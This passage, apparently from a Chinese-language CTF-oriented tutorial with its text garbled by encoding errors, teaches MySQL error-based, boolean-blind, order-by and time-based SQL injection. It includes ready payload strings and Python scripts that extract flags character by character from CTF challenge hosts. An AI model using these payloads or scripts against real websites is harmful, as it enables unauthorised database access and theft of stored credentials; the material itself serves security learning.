manage),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¯ä¸€äº›å¸¸è§æˆ–è€…ä¸å¸¸è§çš„èƒ½å¤ŸæŠ¥é”™æ³¨å…¥çš„å‡½æ•°(å…¶å®æœ‰äº›è¿˜æ˜¯å¾ˆå†·é—¨çš„ğŸ¤£)ï¼ŒæŠ¥é”™æ³¨å…¥å°±æ˜¯åˆ©ç”¨è¿™äº›å‡½æ•°ï¼Œåœ¨æˆ‘ä»¬çš„æŸ¥è¯¢è¯­å¥ä¸­çš„è¿™äº›å‡½æ•°å†…çš„æŸä¸ªä½ç½®å†åµŒå¥—ä¸€ä¸ªå­æŸ¥è¯¢ï¼Œåˆ©ç”¨äº§ç”Ÿçš„æŠ¥é”™å°†å­æŸ¥è¯¢çš„ç»“æœå›æ˜¾å‡ºæ¥ï¼Œæ¯ä¸ªæŠ¥é”™æ³¨å…¥çš„å‡½æ•°éƒ½æ­é…äº†ç½‘ä¸Šæ‰¾åˆ°çš„ç®€å•çš„payloadï¼Œæƒ…å†µæ€»æ˜¯åœ¨å˜åŒ–ï¼Œæ³¨æ„ä¸€ä¸‹å‡½æ•°ä¸­å­æŸ¥è¯¢æ‰€åœ¨çš„ä½ç½®å³å¯ã€‚</p><h6 id="ä½¿ç”¨ä¸å­˜åœ¨çš„å‡½æ•°æ¥æŠ¥é”™"><a href="#ä½¿ç”¨ä¸å­˜åœ¨çš„å‡½æ•°æ¥æŠ¥é”™" class="headerlink" title="ä½¿ç”¨ä¸å­˜åœ¨çš„å‡½æ•°æ¥æŠ¥é”™"></a>ä½¿ç”¨ä¸å­˜åœ¨çš„å‡½æ•°æ¥æŠ¥é”™</h6><p>éšä¾¿ä½¿ç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼Œå¯èƒ½ä¼šå¾—åˆ°å½“å‰æ‰€åœ¨çš„æ•°æ®åº“åç§°ã€‚</p><h6 id="ä½¿ç”¨-join-using-æŠ¥é”™è·å–åˆ—å"><a href="#ä½¿ç”¨-join-using-æŠ¥é”™è·å–åˆ—å" class="headerlink" title="ä½¿ç”¨ join using() æŠ¥é”™è·å–åˆ—å"></a>ä½¿ç”¨ join using() æŠ¥é”™è·å–åˆ—å</h6><ul><li>ä¸€èˆ¬åº”ç”¨äº<strong>æ— åˆ—åæ³¨å…¥</strong>ï¼Œä¸‹æ–‡ç»•è¿‡ä¸­ä¼šç»†è®²ã€‚</li></ul><blockquote><p>é€šè¿‡å…³é”®å­—joinå¯å»ºç«‹ä¸¤ä¸ªè¡¨ä¹‹é—´çš„å†…è¿æ¥ã€‚é€šè¿‡å¯¹æƒ³è¦æŸ¥è¯¢åˆ—åæ‰€åœ¨çš„è¡¨ä¸å…¶è‡ªèº«å†…è¿æ¥ï¼Œä¼šç”±äºå†—ä½™çš„åŸå› ï¼ˆç›¸åŒåˆ—åå­˜åœ¨ï¼‰ï¼Œè€Œå‘ç”Ÿé”™è¯¯ã€‚å¹¶ä¸”æŠ¥é”™ä¿¡æ¯ä¼šå­˜åœ¨é‡å¤çš„åˆ—åï¼Œå¯ä»¥ä½¿ç”¨ USING è¡¨è¾¾å¼å£°æ˜å†…è¿æ¥ï¼ˆINNER JOINï¼‰æ¡ä»¶æ¥é¿å…æŠ¥é”™ã€‚</p></blockquote><p>ä¸‹é¢æ¼”ç¤ºå¦‚ä½•é€šè¿‡joinâ€¦usingæ¥è·å–åˆ—åï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># è·å–ç¬¬ä¸€åˆ—çš„åˆ—å:</span><br><span class="line">1&#x27; union select * from (select * from users as a join users as b)as c#</span><br><span class="line"></span><br><span class="line"># ä½¿ç”¨using()ä¾æ¬¡è·å–åç»­çš„åˆ—å</span><br><span class="line">1&#x27; union all select * from (select * from users as a join users b using(id))c#</span><br><span class="line">1&#x27; union all select * from (select * from users as a join users b using(id,username))c#</span><br><span class="line">1&#x27; union all select * from (select * from users as a join users b using(id,username,password))c#</span><br><span class="line"># æ•°æ®åº“ä¸­asä¸»è¦ä½œç”¨æ˜¯èµ·åˆ«å, å¸¸è§„æ¥è¯´aséƒ½å¯ä»¥çœç•¥ï¼Œä½†æ˜¯ä¸ºäº†å¢åŠ å¯è¯»æ€§, ä¸å»ºè®®çœç•¥</span><br></pre></td></tr></table></figure><h5 id="0x11-flooræŠ¥é”™æ³¨å…¥"><a href="#0x11-flooræŠ¥é”™æ³¨å…¥" class="headerlink" title="0x11 flooræŠ¥é”™æ³¨å…¥"></a>0x11 flooræŠ¥é”™æ³¨å…¥</h5><blockquote><p><strong>floor()æŠ¥é”™æ³¨å…¥çš„åŸå› </strong>æ˜¯   <strong>group by</strong>åœ¨å‘ä¸´æ—¶è¡¨æ’å…¥æ•°æ®æ—¶ï¼Œç”±äº   **rand()**å¤šæ¬¡è®¡ç®—å¯¼è‡´æ’å…¥ä¸´æ—¶è¡¨æ—¶ä¸»é”®é‡å¤ï¼Œä»è€ŒæŠ¥é”™ï¼Œåˆå› ä¸ºæŠ¥é”™å‰   **concat()**ä¸­çš„SQLè¯­å¥æˆ–å‡½æ•°è¢«æ‰§è¡Œï¼Œæ‰€ä»¥è¯¥è¯­å¥æŠ¥é”™ä¸”è¢«æŠ›å‡ºçš„ä¸»é”®æ˜¯SQLè¯­å¥æˆ–æ•°æ‰§è¡Œåçš„ç»“æœã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),floor(rand(0)*2) from users group by floor(rand(0)*2)</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬è¾“å…¥è¯¥sqlè¯­å¥çš„æ—¶å€™ä¼šæç¤º<code>1</code>è¿™ä¸ªä¸»é”®é‡å¤ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿåœ¨è®²è§£ä¹‹å‰æˆ‘ä»¬é¦–å…ˆè¦äº†è§£ä¸€ä¸ªç‰¹æ€§ï¼Œå°±æ˜¯rand()å‡½æ•°çš„ä¸€ä¸ªç‰¹æ€§ï¼ˆ**floor(rand(0)*2)ç¬¬äº”æ¬¡æ‰§è¡Œrand(0)æ—¶ç®—å‡ºäº†1ï¼Œå¯¼è‡´æ’å…¥æ—¶ä¸»é”®é‡å¤å¼‚å¸¸**ï¼‰</p><blockquote><p>è¿™ä¸ªç‰¹æ€§å°±æ˜¯   <strong>rand()å‡½æ•°çš„æ‰§è¡Œé€Ÿåº¦</strong>è¦æ¯”   <strong>group byæŸ¥è¯¢å¹¶æ’å…¥keyå€¼çš„é€Ÿåº¦</strong>æ›´å¿«  </p></blockquote><p>å› æ­¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨é‡Œé¢å¤¹å¸¦æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(database(),floor(rand(0)*2)) from users group by concat(database(),floor(rand(0)*2))</span><br></pre></td></tr></table></figure><p>ç®€åŒ–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),(concat(database(),floor(rand(0)*2)))x from users group by x;</span><br></pre></td></tr></table></figure><p>å¤§ä½“çš„æ³¨å…¥æµç¨‹å°±æ˜¯åœ¨è”åˆæŸ¥è¯¢ä¸æˆåŠŸçš„æƒ…å†µä¸‹å°è¯•ä½¿ç”¨æŠ¥é”™æ³¨å…¥çš„å‡½æ•°å¾—åˆ°å›æ˜¾å­æŸ¥è¯¢ç»“æœçš„æŠ¥é”™ç»“æœã€‚</p><hr><h3 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h3><p>SQL  Injectionï¼ˆBlindï¼‰ï¼Œå³SQLç›²æ³¨ï¼Œä¸ä¸€èˆ¬æ³¨å…¥çš„åŒºåˆ«åœ¨äºï¼Œä¸€èˆ¬çš„æ³¨å…¥æ”»å‡»è€…å¯ä»¥ç›´æ¥ä»é¡µé¢ä¸Šçœ‹åˆ°æ³¨å…¥è¯­å¥çš„æ‰§è¡Œç»“æœï¼Œè€Œç›²æ³¨æ—¶æ”»å‡»è€…é€šå¸¸æ˜¯æ— æ³•ä»æ˜¾ç¤ºé¡µé¢ä¸Šè·å–sqlè¯­å¥çš„æ‰§è¡Œç»“æœï¼Œç”šè‡³è¿æ³¨å…¥è¯­å¥æ˜¯å¦æ‰§è¡Œéƒ½æ— ä»å¾—çŸ¥ï¼Œå› æ­¤ç›²æ³¨çš„éš¾åº¦è¦æ¯”ä¸€èˆ¬æ³¨å…¥é«˜ã€‚ç›®å‰ç½‘ç»œä¸Šç°å­˜çš„SQLæ³¨å…¥æ¼æ´å¤§å¤šæ˜¯SQLç›²æ³¨ï¼Œã€‚</p><p>å¯¹äºåŸºäºå¸ƒå°”çš„ç›²æ³¨ï¼Œå¯é€šè¿‡æ„é€ çœŸorå‡åˆ¤æ–­æ¡ä»¶ï¼ˆæ•°æ®åº“å„é¡¹ä¿¡æ¯å–å€¼çš„å¤§å°æ¯”è¾ƒï¼Œ  å¦‚ï¼šå­—æ®µé•¿åº¦ã€ç‰ˆæœ¬æ•°å€¼ã€å­—æ®µåã€å­—æ®µåå„ç»„æˆéƒ¨åˆ†åœ¨ä¸åŒä½ç½®å¯¹åº”çš„å­—ç¬¦ASCIIç â€¦ï¼‰ï¼Œ  å°†æ„é€ çš„sqlè¯­å¥æäº¤åˆ°æœåŠ¡å™¨ï¼Œç„¶åæ ¹æ®æœåŠ¡å™¨å¯¹ä¸åŒçš„è¯·æ±‚è¿”å›ä¸åŒçš„é¡µé¢ç»“æœ  ï¼ˆTrueã€Falseï¼‰ï¼›ç„¶åä¸æ–­è°ƒæ•´åˆ¤æ–­æ¡ä»¶ä¸­çš„æ•°å€¼ä»¥é€¼è¿‘çœŸå®å€¼ï¼Œç‰¹åˆ«æ˜¯éœ€è¦å…³æ³¨å“åº”ä»True&lt;â€“&gt;Falseå‘ç”Ÿå˜åŒ–çš„è½¬æŠ˜ç‚¹ã€‚</p><h4 id="ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†"><a href="#ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†" class="headerlink" title="ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†"></a>ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†</h4><p>ä¼šç”¨åˆ°æˆªå–å­—ç¬¦çš„å‡½æ•°ï¼š<code>substr()</code></p><p>å¯ä»¥ç›´æ¥åˆ¤æ–­å­—ç¬¦æˆ–è€…æ ¹æ®ASCIIç æ¥åˆ¤æ–­ï¼Œåˆ©ç”¨ASCIIç æ—¶è¦ç”¨åˆ°<code>ASCII()</code>å‡½æ•°æ¥å°†å­—ç¬¦è½¬æ¢ä¸ºASCIIç å€¼ã€‚</p><p>è¿˜ç”¨åˆ°äº†å„ç§è¿ç®—ç¬¦ï¼Œ<code>&lt;</code>ï¼Œ<code>&gt;</code>ï¼Œ<code>=</code>å½“ç„¶ä¸å¿…å¤šæï¼Œä½†æ˜¯åœ¨ä¸‹é¢POSTçš„æ–¹å¼ä¸­ç”¨åˆ°äº†å¼‚æˆ–ç¬¦å·<code>^</code>ï¼Œè¿™é‡Œå…¶å®æ˜¯ä¸€ç§å¼‚æˆ–æ³¨å…¥çš„æ–¹æ³•ï¼Œå½“æˆ‘ä»¬åœ¨å°è¯•SQLæ³¨å…¥æ—¶,å‘ç°union,andç­‰ä¸€äº›åˆ—çš„å­—ç¬¦è¢«å®Œå…¨è¿‡æ»¤æ‰äº†,å°±å¯ä»¥è€ƒè™‘ä½¿ç”¨å¼‚æˆ–æ³¨å…¥ã€‚è€Œå¼‚æˆ–è¿ç®—ï¼Œä¸ä»…åœ¨sqlæ³¨å…¥ä¸­æœ‰ç”¨ï¼Œå¾ˆå¤šåœ°æ–¹å¦‚è¿‡æ»¤äº†æ‰€æœ‰å‡½æ•°ç­‰æ¯”å¦‚å‘½ä»¤æ‰§è¡Œçš„é¢˜ï¼Œå°±å¯ä»¥è¿›è¡Œå¼‚æˆ–è¿›è¡Œæ„é€ ï¼Œä½†æ˜¯è¿ç®—æ–¹å¼ä¸æ­¢ä¸€ç§ï¼Œæˆ‘ä»¬è¦æ ¹æ®å®é™…æƒ…å†µå»é€‰æ‹©ï¼Œå­¦ä¼šå˜é€šï¼Œæ‰æ˜¯å­¦ä¹ çš„æ ¸å¿ƒæ€æƒ³</p><blockquote><p>å¼‚æˆ–è¿ç®—è§„åˆ™:<br> <code>1^1=0 0^0=0 0^1=1</code><br> <code>1^1^1=0 1^1^0=0</code><br> æ„é€ payload:<code>&#39;^ascii(mid(database(),1,1)=98)^0</code></p></blockquote><p>æ³¨æ„è¿™é‡Œä¼šå¤šåŠ ä¸€ä¸ª^0æˆ–1æ˜¯å› ä¸ºåœ¨ç›²æ³¨çš„æ—¶å€™å¯èƒ½å‡ºç°äº†è¯­æ³•é”™è¯¯ä¹Ÿæ— æ³•åˆ¤æ–­,è€Œæ”¹å˜è¿™é‡Œçš„0æˆ–1,å¦‚æœè¿”å›çš„ç»“æœæ˜¯ä¸åŒçš„,é‚£å°±å¯ä»¥è¯æ˜è¯­æ³•æ˜¯æ²¡æœ‰é—®é¢˜çš„.</p><h5 id="æ³¨å…¥æµç¨‹-2"><a href="#æ³¨å…¥æµç¨‹-2" class="headerlink" title="æ³¨å…¥æµç¨‹"></a>æ³¨å…¥æµç¨‹</h5><p>é¦–å…ˆé€šè¿‡é¡µé¢å¯¹äºæ°¸çœŸæ¡ä»¶<code>or 1=1</code>ï¼ˆtrueï¼‰ ä¸æ°¸å‡æ¡ä»¶ <code>and 1=2</code> (false)çš„è¿”å›å†…å®¹æ˜¯å¦å­˜åœ¨<code>å·®å¼‚</code>è¿›è¡Œåˆ¤æ–­æ˜¯å¦å¯ä»¥è¿›è¡Œå¸ƒå°”ç›²æ³¨ã€‚</p><p>ä¸‹é¢ç»™å‡ºå¸¸ç”¨çš„å¸ƒå°”ç›²æ³¨è„šæœ¬ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://81689af7-4cd5-432c-a88e-f5113e16c7c1.node3.buuoj.cn/index.php&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,250):</span><br><span class="line">   low = 32</span><br><span class="line">   high = 128</span><br><span class="line">   mid = (low+high)//2</span><br><span class="line">   while(low&lt;high):</span><br><span class="line">       #payload = &#x27;http://d63d924a-88e3-4036-b463-9fc6a00f4fef.node3.buuoj.cn/search.php?id=1^(ascii(substr(database(),%d,1))=%d)#&#x27; %(i,mid)</span><br><span class="line">       payload = &quot;0^(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)#&quot; %(i,mid)</span><br><span class="line">       datas = &#123;</span><br><span class="line">                     &quot;id&quot;:payload</span><br><span class="line">                &#125;</span><br><span class="line">       res = requests.post(url=url,data=datas)</span><br><span class="line"></span><br><span class="line">       if &#x27;girlfriend&#x27; in res.text:      # ä¸ºçœŸæ—¶ï¼Œå³åˆ¤æ–­æ­£ç¡®çš„æ—¶å€™çš„æ¡ä»¶</span><br><span class="line">           low = mid+1</span><br><span class="line">       else:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//2</span><br><span class="line">   if(mid ==32 or mid ==127):</span><br><span class="line">       break</span><br><span class="line">   flag = flag+chr(mid)</span><br><span class="line">   print(flag)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ä¼˜åŒ–ç®—æ³•ç”¨çš„æ˜¯ä¸€ä¸ªç®€å•çš„äºŒåˆ†æŸ¥æ‰¾ï¼Œç›®çš„æ˜¯è·‘å‡ºè¯¥ç½‘ç«™çš„flagï¼ˆå­—æ®µï¼‰å¯¹äºç›²æ³¨ï¼Œæœ€å¥½çš„åŠæ³•å°±æ˜¯å¤šå†™è„šæœ¬ï¼Œè„šæœ¬çš„ä½œç”¨æ— éå°±æ˜¯ä¸ºæˆ‘ä»¬æ‰§è¡Œå¤§é‡çš„ï¼Œé‡å¤çš„æ“ä½œï¼Œå› æ­¤æˆ‘ä»¬è¦å¯¹è„šæœ¬çš„ç¼–å†™è¦æœ‰é€»è¾‘æ€§ï¼Œå¤šå†™ä¸ªå‡ éï¼Œå°±å¥½æŒæ¡äº†ï¼</p><h6 id="åˆ©ç”¨å¼‚æˆ–çš„ï¼š"><a href="#åˆ©ç”¨å¼‚æˆ–çš„ï¼š" class="headerlink" title="åˆ©ç”¨å¼‚æˆ–çš„ï¼š"></a>åˆ©ç”¨å¼‚æˆ–çš„ï¼š</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;^1--+</span><br><span class="line">?id=0&#x27;^0--+</span><br><span class="line">?id=0&#x27;^(ascii(substr(database(),1,1))&gt;1)--+</span><br><span class="line">?id=0&#x27;^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),&#123;0&#125;,1))=&#123;1&#125;)--+</span><br></pre></td></tr></table></figure><h6 id="åˆ©ç”¨order-byçš„"><a href="#åˆ©ç”¨order-byçš„" class="headerlink" title="åˆ©ç”¨order byçš„"></a>åˆ©ç”¨order byçš„</h6><ul><li><strong>è¯¥æ–¹æ³•åªé€‚ç”¨äºè¡¨é‡Œå°±ä¸€è¡Œæ•°æ®çš„æ—¶å€™ã€‚</strong></li></ul><p>å¦‚æœæ³¨å…¥çš„æ—¶å€™æ²¡æœ‰æŠ¥é”™ï¼Œæˆ‘ä»¬åˆä¸çŸ¥é“åˆ—åï¼Œå°±åªèƒ½ç”¨ order by ç›²æ³¨äº†ã€‚å½“ç„¶ï¼Œåœ¨ <strong>è¿‡æ»¤äº†æ‹¬å·</strong> çš„æ—¶å€™ï¼Œorder by ç›²æ³¨ä¹Ÿæ˜¯ä¸ªå¾ˆå¥½çš„åŠæ³•ã€‚</p><p>order by çš„ä¸»è¦ä½œç”¨å°±æ˜¯è®©æŸ¥è¯¢å‡ºæ¥çš„æ•°æ®æ ¹æ®ç¬¬nåˆ—è¿›è¡Œæ’åºï¼ˆé»˜è®¤å‡åºï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨order byæ’åºæ¯”è¾ƒå­—ç¬¦çš„ ascii ç å¤§å°ï¼Œä»ç¬¬â¼€ä½å¼€å§‹æ¯”è¾ƒï¼Œç¬¬â¼€ä½ç›¸åŒæ—¶æ¯”è¾ƒä¸‹â¼€ä½ã€‚</p><p>åˆ©ç”¨æ–¹å¼å‚è§å¦‚ä¸‹æµ‹è¯•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where username=&#x27;&#x27; or 1 union select 1,2,&#x27;5&#x27; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | 2        | 5                                |</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where username=&#x27;&#x27; or 1 union select 1,2,&#x27;6&#x27; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|  1 | 2        | 6                                |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where username=&#x27;&#x27; or 1 union select 1,2,&#x27;51&#x27; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | 2        | 51                               |</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where username=&#x27;&#x27; or 1 union select 1,2,&#x27;52&#x27; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|  1 | 2        | 52                               |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>é€šè¿‡é€ä½åˆ¤æ–­ä¾¿å¯å¾—åˆ°<code>password</code></p><p>å‚è€ƒè„šæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"># å®šä¹‰ä¸€ä¸ªflagå–å€¼çš„ä¸€ä¸ªâ€œèŒƒå›´â€</span><br><span class="line">dic = &quot;1234567890qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM_!@#$%^&amp;*&quot;</span><br><span class="line"># ä¹‹æ‰€ä»¥ä¸å®šä¹‰ä¸ºç©ºï¼Œè€Œæ˜¯â€œ^â€ï¼Œæ˜¯ä¸ºäº†ä»å¤´å¼€å§‹åŒ¹é…</span><br><span class="line">flag = &quot;^&quot;</span><br><span class="line"># ç›®æ ‡urlï¼Œå…ˆä¼ â€œ|1â€ï¼Œè·å–å…¶æ•°æ®çš„æ’åˆ—å†…å®¹ï¼Œä½œä¸ºä¸€ä¸ªå¯¹æ¯”çš„åŸºå‡†</span><br><span class="line">url1 = &quot;https://chall.tasteless.eu/level1/index.php?dir=|1&quot;</span><br><span class="line">content1 = requests.get(url1).content</span><br><span class="line"># è¿™ä¸ªflagçš„é•¿åº¦è¢«å®šä¹‰ä¸ºäº†50ä¸ªå­—ç¬¦é•¿åº¦</span><br><span class="line">for i in range(50):</span><br><span class="line">    # ä»å®šä¹‰çš„dicä¸­æŒ¨ä¸ªå–1å­—ç¬¦ï¼Œæ‹¼å‡‘payload</span><br><span class="line">    for letter in dic:</span><br><span class="line">        payload = flag + letter</span><br><span class="line">        #è¯¥urlæœ€åçš„â€œ&#125;2b1â€--&gt;&quot;&#125;+1&quot;</span><br><span class="line">        url2 = &quot;https://chall.tasteless.eu/level1/index.php?dir=|&#123;select (select flag from level1_flag) regexp &quot;+&quot;&#x27;&quot;+ payload +&quot;&#x27;&quot;+&quot;&#125;%2b1&quot;</span><br><span class="line">        print(url)</span><br><span class="line">        # è·å–å®é™…æ³¨å…¥åçš„æ’åˆ—å†…å®¹</span><br><span class="line">        content2 = requests.get(url2).content</span><br><span class="line">        # å¦‚æœä¸ç›¸ç­‰ï¼Œå³ä¸ºflagå†…å®¹ï¼ˆä¸ºä»€ä¹ˆæ˜¯ä¸ç›¸ç­‰ï¼Œè€Œä¸æ˜¯ç›¸ç­‰ï¼Œå› ä¸ºåœ¨url2çš„æœ€ååˆâ€œ+1â€ï¼Œå³åŒ¹é…æˆåŠŸåˆ™æ˜¯â€œ?dir=|2â€ï¼ŒåŒ¹é…ä¸æˆåŠŸåˆ™æ˜¯â€œ?dir=|1â€ï¼‰</span><br><span class="line">        if(content1 != content2):</span><br><span class="line">            flag = payload</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><hr><h3 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h3><p>æœ‰çš„ç›²æ³¨æ—¢ä¸èƒ½æ ¹æ®é¡µé¢è¿”å›å†…å®¹åˆ¤æ–­ä»»ä½•ä¿¡æ¯ï¼Œç”¨æ¡ä»¶è¯­å¥æŸ¥çœ‹æ—¶é—´å»¶è¿Ÿè¯­å¥æ˜¯å¦æ‰§è¡Œï¼ˆå³é¡µé¢è¿”å›æ—¶é—´æ˜¯å¦å¢åŠ ï¼‰æ¥åˆ¤æ–­ï¼Œå…¶å®ä¹Ÿæ˜¯ä»å¦ä¸€ä¸ªæˆ‘ä»¬èƒ½æ§åˆ¶çš„è§’åº¦æ¥åˆ¤æ–­äº†å¸ƒå°”å€¼ã€‚</p><p>å¯¹äºåŸºäºæ—¶é—´çš„ç›²æ³¨ï¼Œé€šè¿‡æ„é€ çœŸorå‡åˆ¤æ–­æ¡ä»¶çš„sqlè¯­å¥ï¼Œ ä¸”sqlè¯­å¥ä¸­æ ¹æ®éœ€è¦è”åˆä½¿ç”¨sleep()å‡½æ•°ä¸€åŒå‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œ  è§‚å¯ŸæœåŠ¡å™¨å“åº”ç»“æœæ˜¯å¦ä¼šæ‰§è¡Œæ‰€è®¾ç½®æ—¶é—´çš„å»¶è¿Ÿå“åº”ï¼Œä»¥æ­¤æ¥åˆ¤æ–­æ‰€æ„é€ æ¡ä»¶çš„çœŸorå‡ï¼ˆè‹¥æ‰§è¡Œsleepå»¶è¿Ÿï¼Œåˆ™è¡¨ç¤ºå½“å‰è®¾ç½®çš„åˆ¤æ–­æ¡ä»¶ä¸ºçœŸï¼‰ï¼›ç„¶åä¸æ–­è°ƒæ•´åˆ¤æ–­æ¡ä»¶ä¸­çš„æ•°å€¼ä»¥é€¼è¿‘çœŸå®å€¼ï¼Œæœ€ç»ˆç¡®å®šå…·ä½“çš„æ•°å€¼å¤§å°oråç§°æ‹¼å†™ã€‚</p><p>é¦–å…ˆä½¿ç”¨ä»¥ä¸‹payloadï¼Œæ ¹æ®é¡µé¢çš„å“åº”æ˜¯å¦æœ‰å»¶è¿Ÿæ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and sleep(5)#</span><br><span class="line">1 and sleep(5)</span><br></pre></td></tr></table></figure><h5 id="æ—¶é—´ç›²æ³¨ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†"><a href="#æ—¶é—´ç›²æ³¨ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†" class="headerlink" title="æ—¶é—´ç›²æ³¨ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†"></a>æ—¶é—´ç›²æ³¨ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†</h5><p>ä¸€èˆ¬çš„æ—¶é—´ç›²æ³¨ä¸»è¦å°±æ˜¯ä½¿ç”¨<code>sleep()</code>å‡½æ•°è¿›è¡Œæ—¶é—´çš„å»¶è¿Ÿï¼Œç„¶åé€šè¿‡ifåˆ¤æ–­æ˜¯å¦æ‰§è¡Œ<code>sleep()</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and if(ascii(substr((select 